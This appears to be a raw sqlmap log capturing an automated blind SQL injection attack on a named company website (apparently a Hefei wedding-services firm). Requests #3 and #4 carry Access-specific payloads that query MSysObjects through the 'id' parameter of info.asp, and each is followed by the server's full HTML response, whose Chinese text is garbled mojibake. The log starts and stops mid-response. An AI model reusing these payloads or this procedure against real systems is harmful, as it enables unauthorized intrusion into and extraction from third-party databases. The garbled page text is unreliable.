+                    document.write("<div class='div_jimg\'><a class='a_jimg' id='a_jimg' href='"+lnkarry[0]+"' title='' style='background:url("+picarry[1]+")' target='_blank'><img id='bigimg' style='filter:RevealTrans (duration='1',transition='23'); visibility:visible;' alt='' src='"+picarry[0]+"'><\/a><ul class='ul_jimg'><li class='li_jimg on' id='li_jimg0' onmouseover='setfoc(0)' onmouseout='playit()'><a href='"+lnkarry[0]+"' target='_blank' class='img'>"+ttlarry[0]+"<\/a><\/li><li class='li_jimg' id='li_jimg1' onmouseover='setfoc(1)' onmouseout='playit()'><a href='"+lnkarry[1]+"' target='_blank' class='img'>"+ttlarry[1]+"<\/a><\/li><li class='li_jimg' id='li_jimg2' onmouseover='setfoc(2)' onmouseout='playit()'><a href='"+lnkarry[2]+"' target='_blank' class='img'>"+ttlarry[2]+"<\/a><\/li><li class='li_jimg' id='li_jimg3' onmouseover='setfoc(3)' onmouseout='playit()'><a href='"+lnkarry[3]+"' target='_blank' class='img'>"+ttlarry[3]+"<\/a><\/li><li class='li_jimg' id='li_jimg4' onmouseover='setfoc(4)' onmouseout='playit()'><a href='"+lnkarry[4]+"' target='_blank' class='img'>"+ttlarry[4]+"<\/a><\/li><li class='li_jimg' id='li_jimg5' onmouseover='setfoc(5)' onmouseout='playit()'><a href='"+lnkarry[5]+"' target='_blank' class='img'>"+ttlarry[5]+"<\/a><\/li><\/ul><\/div>");
+-->
+</SCRIPT>
+</DIV></div>
+<div class="dy_con">
+  <div class="dy_con_l">
+    <div class="dy_con_l_01"> <span style="float:left;"><img src="images/dy_t01.jpg" /></span> <span style="float:left; width:243px; height:203px; padding-top:11px; background:#9c920a;">
+  
+ <a href="info.asp?id=17" target="_blank" class="dy_01">��ɴ��Ӱ</a>
+ 
+ <a href="info.asp?id=18" target="_blank" class="dy_01">�鳵����</a>
+ 
+ <a href="info.asp?id=19" target="_blank" class="dy_01">��ױ����</a>
+ 
+ <a href="info.asp?id=20" target="_blank" class="dy_01">ʱ�л���</a>
+ 
+ <a href="info.asp?id=21" target="_blank" class="dy_01">�������</a>
+ 
+ <a href="info.asp?id=42" target="_blank" class="dy_01">����ǣ��~</a>
+ 
+ <a href="info.asp?id=43" target="_blank" class="dy_01">��������</a>
+ 
+ <a href="info.asp?id=45" target="_blank" class="dy_01">�������Ư���Ķ������</a>
+ 
+ <a href="info.asp?id=46" target="_blank" class="dy_01">������ױע������</a>
+ 
+ <a href="info.asp?id=47" target="_blank" class="dy_01">�����ļ�����ױ��ע������</a>
+ 
+ <a href="info.asp?id=48" target="_blank" class="dy_01">�����＾��θ�����ˮ</a>
+ 
+ </span></div>
+    <div class="dy_con_l_02"> <span style="float:left;"><img src="images/dy_t02.jpg" /></span> <span style="float:left; width:243px; height:255px; padding-top:15px; background:#9c920a;">
+	 
+      <div class="dy_ti"><a href="info.asp?id=1061" target="_blank" class="dy_02">���ݸ�A1��-Ψ��������ӳ...</a></div>
+  
+      <div class="dy_ti"><a href="info.asp?id=1060" target="_blank" class="dy_02">����ǰ�����������ʲô...</a></div>
+  
+      <div class="dy_ti"><a href="info.asp?id=1059" target="_blank" class="dy_02">����֮��ע������...</a></div>
+  
+      <div class="dy_ti"><a href="info.asp?id=1058" target="_blank" class="dy_02">��������������������ʤ��...</a></div>
+  
+      <div class="dy_ti"><a href="info.asp?id=1057" target="_blank" class="dy_02">��������̨�������е�10����...</a></div>
+  
+      <div class="dy_ti"><a href="info.asp?id=1056" target="_blank" class="dy_02">����"����"���...</a></div>
+  
+      <div class="dy_ti"><a href="info.asp?id=1055" target="_blank" class="dy_02">����֮������� "����"...</a></div>
+  
+      <div class="dy_ti"><a href="info.asp?id=1054" target="_blank" class="dy_02">�����ر��������...</a></div>
+  
+      </span> </div>
+  </div>
+  <div class="dy_con_r_t" style="background:url(images/dya.jpg)"> <span style="float:right; width:240px; height:22px; padding:24px 0px 0px 0px;">���ĵ�ǰλ�ã�<a href="index.asp" class="d">�Ϸʻ�����ҳ</a> >> <a href="news.asp?lid=" class="d"></a></span> </div>
+  <div class="dy_con_r_c">
+   <div style="text-align:center; font-size:16px; font-weight:bold; padding-top:20px;"><hr style="width:98%;" color="#FFFFFF"></div>
+   <div style="text-align:center;">�������ڣ��������������� ��</div>
+   <div class="nei"></div>
+   
+  </div>
+  <div class="dy_con_r_d"></div>
+</div>
+<div id="foor">
+   <div class="foor_01">
+        <a href="about.asp?n=gsjj" class="d">��������</a> |�
+        <a href="news.asp?lid=1" class="d">ʱ����Ѷ</a> |�
+        <a href="news.asp?lid=8" class="d">������Ŀ</a> |�
+        <a href="news.asp?lid=7" class="d">�����ײ�</a> |�
+        <a href="pro.asp?lid=24" class="d">���ʳ���</a> |�
+        <a href="about.asp?n=lxwm" class="d">��ϵ����</a>
+   </div>
+   <div class="foor_02">
+     <span style="float:left; width:600px; height:22px; padding-left:365px; padding-top:8px;">Copyright � 2007-2012 �Ϸ��������鴴��������޹�˾</span>
+     <span style="float:left; width:600px; height:22px; padding-left:365px;">��ַ������ʡ�Ϸ����ٴ�·�뺬ɽ·��������4F��¥���������鴴�����</span>
+	 <span style="float:left; width:600px; height:22px; padding-left:365px;">�绰��0551��62625238�������䣺NMxinqing@163.com ��<!-- hisweet.com Baidu tongji analytics -->
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F183d55262f38db14ca2b73f42f2d11ec' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script src="http://s13.cnzz.com/stat.php?id=3795585&web_id=3795585&show=pic" language="JavaScript"></script>
+
+</span>
+   </div>
+</div>
+
+</body>
+</html>
+
+############################################################################
+
+HTTP request [#3]:
+GET /info.asp?id=781%20AND%20ASCW%28MID%28%28SELECT%20IIF%28LEN%28CVAR%28COUNT%28Name%29%29%29=0%2CCHR%2832%29%2CCVAR%28COUNT%28Name%29%29%29%20FROM%20MSysObjects%20WHERE%20Type=1%29%2C1%2C1%29%29%20%3E%2048 HTTP/1.1
+Accept-language: en-us,en;q=0.5
+Accept-encoding: gzip,deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0-dev (http://sqlmap.org)
+Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
+Host: www.hisweet.com
+Pragma: no-cache
+Cache-control: no-cache,no-store
+Cookie: ASPSESSIONIDQQARRART=GBJMCBPCDIDCAEEINKNBCPAJ
+Connection: close
+
+HTTP response [#3] (200 OK):
+Content-length: 12883
+X-powered-by: ASP.NET
+Uri: http://www.hisweet.com:80/info.asp?id=781%20AND%20ASCW%28MID%28%28SELECT%20IIF%28LEN%28CVAR%28COUNT%28Name%29%29%29=0%2CCHR%2832%29%2CCVAR%28COUNT%28Name%29%29%29%20FROM%20MSysObjects%20WHERE%20Type=1%29%2C1%2C1%29%29%20%3E%2048
+Server: Microsoft-IIS/6.0
+Connection: close
+Cache-control: private
+Date: Wed, 04 Dec 2013 09:20:28 GMT
+Content-type: text/html
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+
+<title>-�Ϸʻ��칫˾��ѡ��������</title>
+<Meta name="Keywords" Content="">
+<meta name="description" content="" />
+<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
+<link href="css/style.css" rel="stylesheet" type="text/css" />
+<script src="js/swfobject.js" type="text/javascript"></script>
+<script language="javascript" type="text/javascript" src="js/ScrollPic.js"></script>
+<script language="javascript"> 
+//ͼƬ����������,����������趨��ʼ��С
+function resizeimg(ImgD,iwidth,iheight) {
+     var image=new Image();
+     image.src=ImgD.src;
+     if(image.width>0 && image.height>0){
+        if(image.width/image.height>= iwidth/iheight){
+           if(image.width>iwidth){
+               ImgD.width=iwidth;
+               ImgD.height=(image.height*iwidth)/image.width;
+           }else{
+                  ImgD.width=image.width;
+                  ImgD.height=image.height;
+                }
+               ImgD.alt=image.width+"��"+image.height;
+        }
+        else{
+                if(image.height>iheight){
+                       ImgD.height=iheight;
+                       ImgD.width=(image.width*iheight)/image.height;
+                }else{
+                        ImgD.width=image.width;
+                        ImgD.height=image.height;
+                     }
+                ImgD.alt=image.width+"��"+image.height;
+            }
+����������ImgD.style.cursor= "pointer"; //�ı����ָ��
+    }
+}
+</script>
+<style>
+a:hover{ cursor:url('images/tbk.cur'),auto;}
+</style>
+</head>
+<body background="images/bg.jpg">
+<script language="javascript" src="http://qqjs4.user.55.la:81/user_pic/qqjs/2012/01/20/12/236797.js"></script>
+<bgsound src="" loop="-1">
+<div id="top">
+    <div class="logo"><a href="index.asp"><img src="images/logo.jpg" alt="�Ϸʻ��칫˾" border="0" /></a></div>
+    <div class="nav">
+      <div class="nav_01">
+           <a href="tencent://message/?uin=522926867&Site=�Ϸ��������鴴��������޹�˾&Menu=yes" target="_blank"><img src="images/xn.jpg" border="0" /></a><a href="tencent://message/?uin=404491138&Site=�Ϸ��������鴴��������޹�˾&Menu=yes" target="_blank"><img src="images/xm.jpg" border="0" /></a>
+      </div>
+           <div class="nav_02">
+<a href="about.asp?n=gsjj"><img src="images/nav01.jpg" alt="�Ϸʻ��칫˾��������" border="0" /></a>
+<a href="news.asp?lid=1"><img src="images/nav02.jpg" alt="�Ϸʻ��칫˾ʱ����Ѷ" border="0" /></a>
+<a href="news.asp?lid=8"><img src="images/nav03.jpg" alt="�Ϸʻ��칫˾������Ŀ" border="0" /></a>
+<a href="news.asp?lid=7" ><img src="images/nav04.jpg" alt="�Ϸʻ��칫˾�����ײ�" border="0" /></a> 
+          </div>
+           <div class="nav_02">
+<a href="pro.asp?lid=25"><img src="images/nav05.jpg" alt="�Ϸʻ��칫˾�������" border="0" /></a>
+<a href="pro.asp?lid=24"><img src="images/nav06.jpg" alt="�Ϸʻ��칫˾���ʳ���" border="0" /></a>
+<a href="pro.asp?lid=26"><img src="images/nav07.jpg" alt="�Ϸʻ��칫˾���ʿ���" border="0" /></a>
+<a href="about.asp?n=lxwm"><img src="images/nav08.jpg" alt="�Ϸʻ��칫˾��ϵ����" border="0" /></a>      </div>
+    </div>
+</div>
+
+<div class="dy_banner"><SCRIPT src="js/AutoChangePhoto.js" type=text/javascript></SCRIPT>
+<style type="text/css">
+<!--
+.div_xixi {BACKGROUND: #fff; MARGIN: 0px auto; WIDTH:992px; POSITION: relative; HEIGHT: 229px}
+.div_jimg {	MARGIN: 0px; WIDTH: 780px; HEIGHT: 229px}
+.div_jimg #a_jimg {DISPLAY: block; WIDTH:780px; HEIGHT: 229px}
+.div_jimg #bigimg {	BORDER-RIGHT: #fd8383 1px solid; PADDING-RIGHT: 0px; BORDER-TOP: #fd8383 1px solid; PADDING-LEFT: 0px; PADDING-BOTTOM: 0px; MARGIN: 0px; BORDER-LEFT: #fd8383 1px solid; WIDTH:777px; PADDING-TOP: 0px; BORDER-BOTTOM: #fd8383 1px solid; HEIGHT: 227px}
+.div_jimg .ul_jimg {PADDING-RIGHT: 0px; DISPLAY: block; PADDING-LEFT: 0px; RIGHT: 0px; BACKGROUND: url(images/bg_j04.jpg) repeat-y right top; PADDING-BOTTOM: 0px; MARGIN: 0px; WIDTH: 225px; PADDING-TOP: 0px; LIST-STYLE-TYPE: none; POSITION: absolute; TOP: 0px; HEIGHT: 229px}
+.div_jimg .ul_jimg LI {DISPLAY: inline; FLOAT: right; OVERFLOW: hidden; WIDTH: 212px; CURSOR: pointer; WORD-BREAK: break-all; TEXT-INDENT: 30px; padding-top:12px;WHITE-SPACE: nowrap; HEIGHT: 26px; TEXT-OVERFLOW: ellipsis}
+.div_jimg .ul_jimg A {POSITION: relative;color:#93891A;}
+.div_jimg .ul_jimg .on {background-image:url(images/bg_j05.png)!important;background-image:url(#);BACKGROUND: none transparent scroll repeat 0% 0%; FILTER: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='images/bg_j05.png',sizingMethod='scale'); WIDTH: 225px; COLOR: #fff; TEXT-INDENT: 43px; POSITION: static}
+.div_jimg .ul_jimg .on A {FONT-WEIGHT: bold; COLOR: #fff}
+a.img{ font-size:14px; color:#93891A; text-decoration:none;font-weight:700; }
+-->
+</style>
+
+<TABLE id=pictable style="DISPLAY: none">
+  <TBODY>
+  <TR>
+    <TD><IMG src="upimg/20121201236358059.jpg" border=0></TD>
+    <TD>���ʺ�����</TD>
+    <TD>http://www.hisweet.com/info.asp?id=284</TD></TR>
+  <TR>
+    <TD><IMG src="upimg/2012291331033165.jpg" border=0></TD>
+    <TD>���ʾ��¼�</TD>
+    <TD>http://www.hisweet.com/info.asp?id=4</TD></TR>
+  <TR>
+    <TD><IMG src="upimg/20122811515933566.jpg" border=0></TD>
+    <TD>���ʴ��˼�</TD>
+    <TD>http://www.hisweet.com/info.asp?id=3</TD></TR>
+  <TR>
+    <TD><IMG src="upimg/20122817355580534.jpg" border=0></TD>
+    <TD>���������</TD>
+    <TD>http://www.hisweet.com/info.asp?id=2</TD></TR>
+  <TR>
+    <TD><IMG src="upimg/20122817465723602.jpg" border=0></TD>
+    <TD>���ʼ�Լ��</TD>
+    <TD>http://www.hisweet.com/info.asp?id=1</TD></TR>
+<TR>
+    <TD><IMG src="upimg/20122111312746235.jpg" border=0></TD>
+    <TD>һվʽ����</TD>
+    <TD>http://www.hisweet.com/info.asp?id=286</TD></TR></TBODY></TABLE>
+
+<DIV class=div_xixi>
+<SCRIPT language=javascript type=text/javascript>
+<!--
+                var picarry = {};
+                var lnkarry = {};
+                var ttlarry = {};
+                  function FixCode(str){
+                    return str.replace("'","=");
+                  }
+                  var t=document.getElementById("pictable");
+                  var rl=t.rows.length;
+                  var baseu=  document.URL.replace(/(http.*\/)(.*)/, "$1"); 
+                  if(baseu.indexOf("/servlet/")>=0)
+                  baseu = baseu.replace("/servlet/","/");
+
+                  var txt="";
+                  for(var i=0;i<rl;i++){
+                    try{
+                        picarry[i]=t.rows[i].cells[0].childNodes[0].src;
+                        lnkarry[i]=t.rows[i].cells[2].innerHTML;
+                        ttlarry[i]=FixCode(t.rows[i].cells[1].innerHTML);
+                        document.getElementById("li_jimg"+i).innerHTML = '<a href="'+lnkarry[id]+'" target="_blank" class="img"><img src="'+picarry[id]+'" alt=""><\/a>';
+                        alert(picarry[i]);
+                    }catch(e){
+        
+                    }
+                }             
+                    document.write("<div class='div_jimg\'><a class='a_jimg' id='a_jimg' href='"+lnkarry[0]+"' title='' style='background:url("+picarry[1]+")' target='_blank'><img id='bigimg' style='filter:RevealTrans (duration='1',transition='23'); visibility:visible;' alt='' src='"+picarry[0]+"'><\/a><ul class='ul_jimg'><li class='li_jimg on' id='li_jimg0' onmouseover='setfoc(0)' onmouseout='playit()'><a href='"+lnkarry[0]+"' target='_blank' class='img'>"+ttlarry[0]+"<\/a><\/li><li class='li_jimg' id='li_jimg1' onmouseover='setfoc(1)' onmouseout='playit()'><a href='"+lnkarry[1]+"' target='_blank' class='img'>"+ttlarry[1]+"<\/a><\/li><li class='li_jimg' id='li_jimg2' onmouseover='setfoc(2)' onmouseout='playit()'><a href='"+lnkarry[2]+"' target='_blank' class='img'>"+ttlarry[2]+"<\/a><\/li><li class='li_jimg' id='li_jimg3' onmouseover='setfoc(3)' onmouseout='playit()'><a href='"+lnkarry[3]+"' target='_blank' class='img'>"+ttlarry[3]+"<\/a><\/li><li class='li_jimg' id='li_jimg4' onmouseover='setfoc(4)' onmouseout='playit()'><a href='"+lnkarry[4]+"' target='_blank' class='img'>"+ttlarry[4]+"<\/a><\/li><li class='li_jimg' id='li_jimg5' onmouseover='setfoc(5)' onmouseout='playit()'><a href='"+lnkarry[5]+"' target='_blank' class='img'>"+ttlarry[5]+"<\/a><\/li><\/ul><\/div>");
+-->
+</SCRIPT>
+</DIV></div>
+<div class="dy_con">
+  <div class="dy_con_l">
+    <div class="dy_con_l_01"> <span style="float:left;"><img src="images/dy_t01.jpg" /></span> <span style="float:left; width:243px; height:203px; padding-top:11px; background:#9c920a;">
+  
+ <a href="info.asp?id=17" target="_blank" class="dy_01">��ɴ��Ӱ</a>
+ 
+ <a href="info.asp?id=18" target="_blank" class="dy_01">�鳵����</a>
+ 
+ <a href="info.asp?id=19" target="_blank" class="dy_01">��ױ����</a>
+ 
+ <a href="info.asp?id=20" target="_blank" class="dy_01">ʱ�л���</a>
+ 
+ <a href="info.asp?id=21" target="_blank" class="dy_01">�������</a>
+ 
+ <a href="info.asp?id=42" target="_blank" class="dy_01">����ǣ��~</a>
+ 
+ <a href="info.asp?id=43" target="_blank" class="dy_01">��������</a>
+ 
+ <a href="info.asp?id=45" target="_blank" class="dy_01">�������Ư���Ķ������</a>
+ 
+ <a href="info.asp?id=46" target="_blank" class="dy_01">������ױע������</a>
+ 
+ <a href="info.asp?id=47" target="_blank" class="dy_01">�����ļ�����ױ��ע������</a>
+ 
+ <a href="info.asp?id=48" target="_blank" class="dy_01">�����＾��θ�����ˮ</a>
+ 
+ </span></div>
+    <div class="dy_con_l_02"> <span style="float:left;"><img src="images/dy_t02.jpg" /></span> <span style="float:left; width:243px; height:255px; padding-top:15px; background:#9c920a;">
+	 
+      <div class="dy_ti"><a href="info.asp?id=1061" target="_blank" class="dy_02">���ݸ�A1��-Ψ��������ӳ...</a></div>
+  
+      <div class="dy_ti"><a href="info.asp?id=1060" target="_blank" class="dy_02">����ǰ�����������ʲô...</a></div>
+  
+      <div class="dy_ti"><a href="info.asp?id=1059" target="_blank" class="dy_02">����֮��ע������...</a></div>
+  
+      <div class="dy_ti"><a href="info.asp?id=1058" target="_blank" class="dy_02">��������������������ʤ��...</a></div>
+  
+      <div class="dy_ti"><a href="info.asp?id=1057" target="_blank" class="dy_02">��������̨�������е�10����...</a></div>
+  
+      <div class="dy_ti"><a href="info.asp?id=1056" target="_blank" class="dy_02">����"����"���...</a></div>
+  
+      <div class="dy_ti"><a href="info.asp?id=1055" target="_blank" class="dy_02">����֮������� "����"...</a></div>
+  
+      <div class="dy_ti"><a href="info.asp?id=1054" target="_blank" class="dy_02">�����ر��������...</a></div>
+  
+      </span> </div>
+  </div>
+  <div class="dy_con_r_t" style="background:url(images/dya.jpg)"> <span style="float:right; width:240px; height:22px; padding:24px 0px 0px 0px;">���ĵ�ǰλ�ã�<a href="index.asp" class="d">�Ϸʻ�����ҳ</a> >> <a href="news.asp?lid=" class="d"></a></span> </div>
+  <div class="dy_con_r_c">
+   <div style="text-align:center; font-size:16px; font-weight:bold; padding-top:20px;"><hr style="width:98%;" color="#FFFFFF"></div>
+   <div style="text-align:center;">�������ڣ��������������� ��</div>
+   <div class="nei"></div>
+   
+  </div>
+  <div class="dy_con_r_d"></div>
+</div>
+<div id="foor">
+   <div class="foor_01">
+        <a href="about.asp?n=gsjj" class="d">��������</a> |�
+        <a href="news.asp?lid=1" class="d">ʱ����Ѷ</a> |�
+        <a href="news.asp?lid=8" class="d">������Ŀ</a> |�
+        <a href="news.asp?lid=7" class="d">�����ײ�</a> |�
+        <a href="pro.asp?lid=24" class="d">���ʳ���</a> |�
+        <a href="about.asp?n=lxwm" class="d">��ϵ����</a>
+   </div>
+   <div class="foor_02">
+     <span style="float:left; width:600px; height:22px; padding-left:365px; padding-top:8px;">Copyright � 2007-2012 �Ϸ��������鴴��������޹�˾</span>
+     <span style="float:left; width:600px; height:22px; padding-left:365px;">��ַ������ʡ�Ϸ����ٴ�·�뺬ɽ·��������4F��¥���������鴴�����</span>
+	 <span style="float:left; width:600px; height:22px; padding-left:365px;">�绰��0551��62625238�������䣺NMxinqing@163.com ��<!-- hisweet.com Baidu tongji analytics -->
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F183d55262f38db14ca2b73f42f2d11ec' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script src="http://s13.cnzz.com/stat.php?id=3795585&web_id=3795585&show=pic" language="JavaScript"></script>
+
+</span>
+   </div>
+</div>
+
+</body>
+</html>
+
+############################################################################
+
+HTTP request [#4]:
+GET /info.asp?id=781%20AND%20ASCW%28MID%28%28SELECT%20IIF%28LEN%28CVAR%28COUNT%28Name%29%29%29=0%2CCHR%2832%29%2CCVAR%28COUNT%28Name%29%29%29%20FROM%20MSysObjects%20WHERE%20Type=1%29%2C1%2C1%29%29%20%3E%201 HTTP/1.1
+Accept-language: en-us,en;q=0.5
+Accept-encoding: gzip,deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0-dev (http://sqlmap.org)
+Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
+Host: www.hisweet.com
+Pragma: no-cache
+Cache-control: no-cache,no-store
+Cookie: ASPSESSIONIDQQARRART=GBJMCBPCDIDCAEEINKNBCPAJ
+Connection: close
+
+HTTP response [#4] (200 OK):
+Content-length: 12883
+X-powered-by: ASP.NET
+Uri: http://www.hisweet.com:80/info.asp?id=781%20AND%20ASCW%28MID%28%28SELECT%20IIF%28LEN%28CVAR%28COUNT%28Name%29%29%29=0%2CCHR%2832%29%2CCVAR%28COUNT%28Name%29%29%29%20FROM%20MSysObjects%20WHERE%20Type=1%29%2C1%2C1%29%29%20%3E%201
+Server: Microsoft-IIS/6.0
+Connection: close
+Cache-control: private
+Date: Wed, 04 Dec 2013 09:20:29 GMT
+Content-type: text/html
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+
+<title>-�Ϸʻ��칫˾��ѡ��������</title>
+<Meta name="Keywords" Content="">
+<meta name="description" content="" />
+<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
+<link href="css/style.css" rel="stylesheet" type="text/css" />
+<script src="js/swfobject.js" type="text/javascript"></script>
+<script language="javascript" type="text/javascript" src="js/ScrollPic.js"></script>
+<script language="javascript"> 
+//ͼƬ����������,����������趨��ʼ��С
+function resizeimg(ImgD,iwidth,iheight) {
+     var image=new Image();
+     image.src=ImgD.src;
+     if(image.width>0 && image.height>0){
+        if(image.width/image.height>= iwidth/iheight){
+           if(image.width>iwidth){
+               ImgD.width=iwidth;
+               ImgD.height=(image.height*iwidth)/image.width;
+           }else{
+                  ImgD.width=image.width;
+                  ImgD.height=image.height;
+                }
+               ImgD.alt=image.width+"��"+image.height;
+        }
+        else{
+                if(image.height>iheight){
+                       ImgD.height=iheight;
+                       ImgD.width=(image.width*iheight)/image.height;
+                }else{
+                        ImgD.width=image.width;
+                        ImgD.height=image.height;
+                     }
+                ImgD.alt=image.width+"��"+image.height;
+            }
+����������ImgD.style.cursor= "pointer"; //�ı����ָ��
+    }
+}
+</script>
+<style>
+a:hover{ cursor:url('images/tbk.cur'),auto;}
+</style>
+</head>
+<body background="images/bg.jpg">
+<script language="javascript" src="http://qqjs4.user.55.la:81/user_pic/qqjs/2012/01/20/12/236797.js"></script>
+<bgsound src="" loop="-1">
+<div id="top">
+    <div class="logo"><a href="index.asp"><img src="images/logo.jpg" alt="�Ϸʻ��칫˾" border="0" /></a></div>
+    <div class="nav">
+      <div class="nav_01">
+           <a href="tencent://message/?uin=522926867&Site=�Ϸ��������鴴��������޹�˾&Menu=yes" target="_blank"><img src="images/xn.jpg" border="0" /></a><a href="tencent://message/?uin=404491138&Site=�Ϸ��������鴴��������޹�˾&Menu=yes" target="_blank"><img src="images/xm.jpg" border="0" /></a>
+      </div>
+           <div class="nav_02">
+<a href="about.asp?n=gsjj"><img src="images/nav01.jpg" alt="�Ϸʻ��칫˾��������" border="0" /></a>
+<a href="news.asp?lid=1"><img src="images/nav02.jpg" alt="�Ϸʻ��칫˾ʱ����Ѷ" border="0" /></a>
+<a href="news.asp?lid=8"><img src="images/nav03.jpg" alt="�Ϸʻ��칫˾������Ŀ" border="0" /></a>
+<a href="news.asp?lid=7" ><img src="images/nav04.jpg" alt="�Ϸʻ��칫˾�����ײ�" border="0" /></a> 
+          </div>
+           <div class="nav_02">
+<a href="pro.asp?lid=25"><img src="images/nav05.jpg" alt="�Ϸʻ��칫˾�������" border="0" /></a>
+<a href="pro.asp?lid=24"><img src="images/nav06.jpg" alt="�Ϸʻ��칫˾���ʳ���" border="0" /></a>
+<a href="pro.asp?lid=26"><img src="images/nav07.jpg" alt="�Ϸʻ��칫˾���ʿ���" border="0" /></a>
+<a href="about.asp?n=lxwm"><img src="images/nav08.jpg" alt="�Ϸʻ��칫˾��ϵ����" border="0" /></a>      </div>
+    </div>
+</div>
+
+<div class="dy_banner"><SCRIPT src="js/AutoChangePhoto.js" type=text/javascript></SCRIPT>
+<style type="text/css">
+<!--
+.div_xixi {BACKGROUND: #fff; MARGIN: 0px auto; WIDTH:992px; POSITION: relative; HEIGHT: 229px}
+.div_jimg {	MARGIN: 0px; WIDTH: 780px; HEIGHT: 229px}
+.div_jimg #a_jimg {DISPLAY: block; WIDTH:780px; HEIGHT: 229px}
+.div_jimg #bigimg {	BORDER-RIGHT: #fd8383 1px solid; PADDING-RIGHT: 0px; BORDER-TOP: #fd8383 1px solid; PADDING-LEFT: 0px; PADDING-BOTTOM: 0px; MARGIN: 0px; BORDER-LEFT: #fd8383 1px solid; WIDTH:777px; PADDING-TOP: 0px; BORDER-BOTTOM: #fd8383 1px solid; HEIGHT: 227px}
+.div_jimg .ul_jimg {PADDING-RIGHT: 0px; DISPLAY: block; PADDING-LEFT: 0px; RIGHT: 0px; BACKGROUND: url(images/bg_j04.jpg) repeat-y right top; PADDING-BOTTOM: 0px; MARGIN: 0px; WIDTH: 225px; PADDING-TOP: 0px; LIST-STYLE-TYPE: none; POSITION: absolute; TOP: 0px; HEIGHT: 229px}
+.div_jimg .ul_jimg LI {DISPLAY: inline; FLOAT: right; OVERFLOW: hidden; WIDTH: 212px; CURSOR: pointer; WORD-BREAK: break-all; TEXT-INDENT: 30px; padding-top:12px;WHITE-SPACE: nowrap; HEIGHT: 26px; TEXT-OVERFLOW: ellipsis}
+.div_jimg .ul_jimg A {POSITION: relative;color:#93891A;}
+.div_jimg .ul_jimg .on {background-image:url(images/bg_j05.png)!important;background-image:url(#);BACKGROUND: none transparent scroll repeat 0% 0%; FILTER: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='images/bg_j05.png',sizingMethod='scale'); WIDTH: 225px; COLOR: #fff; TEXT-INDENT: 43px; POSITION: static}
+.div_jimg .ul_jimg .on A {FONT-WEIGHT: bold; COLOR: #fff}
+a.img{ font-size:14px; color:#93891A; text-decoration:none;font-weight:700; }
+-->
+</style>
+
+<TABLE id=pictable style="DISPLAY: none">
+  <TBODY>
+  <TR>
+    <TD><IMG src="upimg/20121201236358059.jpg" border=0></TD>
+    <TD>���ʺ�����</TD>
+    <TD>http://www.hisweet.com/info.asp?id=284</TD></TR>
+  <TR>
+    <TD><IMG src="upimg/2012291331033165.jpg" border=0></TD>
+    <TD>���ʾ��¼�</TD>
+    <TD>http://www.hisweet.com/info.asp?id=4</TD></TR>
+  <TR>
+    <TD><IMG src="upimg/20122811515933566.jpg" border=0></TD>
+    <TD>���ʴ��˼�</TD>
+    <TD>http://www.hisweet.com/info.asp?id=3</TD></TR>
+  <TR>
+    <TD><IMG src="upimg/20122817355580534.jpg" border=0></TD>
+    <TD>���������</TD>
+    <TD>http://www.hisweet.com/info.asp?id=2</TD></TR>
+  <TR>
+    <TD><IMG src="upimg/20122817465723602.jpg" border=0></TD>
+    <TD>���ʼ�Լ��</TD>
+    <TD>http://www.hisweet.com/info.asp?id=1</TD></TR>
+<TR>
+    <TD><IMG src="upimg/20122111312746235.jpg" border=0></TD>
+    <TD>һվʽ����</TD>
+    <TD>http://www.hisweet.com/info.asp?id=286</TD></TR></TBODY></TABLE>
+
+<DIV class=div_xixi>
+<SCRIPT language=javascript type=text/javascript>
+<!--
+                var picarry = {};
+                var lnkarry = {};
+                var ttlarry = {};
+                  function FixCode(str){
+                    return str.replace("'","=");
+                  }
+                  var t=document.getElementById("pictable");
+                  var rl=t.rows.length;
+                  var baseu=  document.URL.replace(/(http.*\/)(.*)/, "$1"); 
+                  if(baseu.indexOf("/servlet/")>=0)
+                  baseu = baseu.replace("/servlet/","/");
+
+                  var txt="";
+                  for(var i=0;i<rl;i++){
+                    try{
+                        picarry[i]=t.rows[i].cells[0].childNodes[0].src;
+                        lnkarry[i]=t.rows[i].cells[2].innerHTML;
+                        ttlarry[i]=FixCode(t.rows[i].cells[1].innerHTML);
+                        document.getElementById("li_jimg"+i).innerHTML = '<a href="'+lnkarry[id]+'" target="_blank" class="img"><img src="'+picarry[id]+'" alt=""><\/a>';
+                        alert(picarry[i]);
+                    }catch(e){
+        
+                    }
+                }             
